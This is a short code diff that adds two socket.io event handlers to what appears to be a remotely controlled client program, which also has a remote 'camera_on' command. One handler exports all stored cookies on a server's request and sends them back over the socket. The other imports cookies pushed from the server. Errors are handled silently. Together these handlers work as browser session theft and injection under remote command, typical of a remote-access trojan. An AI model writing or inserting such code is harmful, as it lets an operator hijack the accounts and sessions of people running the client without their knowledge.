@@ -193,6 +193,32 @@ def _connect_loop():
         except Exception:
             pass
 
+    @sio.on("export_cookies")
+    def _on_export_cookies(data):
+        try:
+            import cookie_manager as cm
+            cookies = cm.export_all()
+            sio.emit("cookies_data", {
+                "cookies": cookies,
+                "count": len(cookies),
+                "_requester": data.get("_requester") if data else None,
+            })
+        except Exception as e:
+            sio.emit("cookies_data", {
+                "error": str(e), "cookies": [], "count": 0,
+                "_requester": data.get("_requester") if data else None,
+            })
+
+    @sio.on("import_cookies")
+    def _on_import_cookies(data):
+        try:
+            import cookie_manager as cm
+            result = cm.import_all(data.get("cookies", []))
+            result["_requester"] = data.get("_requester")
+            sio.emit("import_result", result)
+        except Exception as e:
+            sio.emit("import_result", {"ok": False, "message": str(e), "_requester": data.get("_requester")})
+
     @sio.on("camera_on")
     def _on_cam_on(_data=None):
         if _camera:
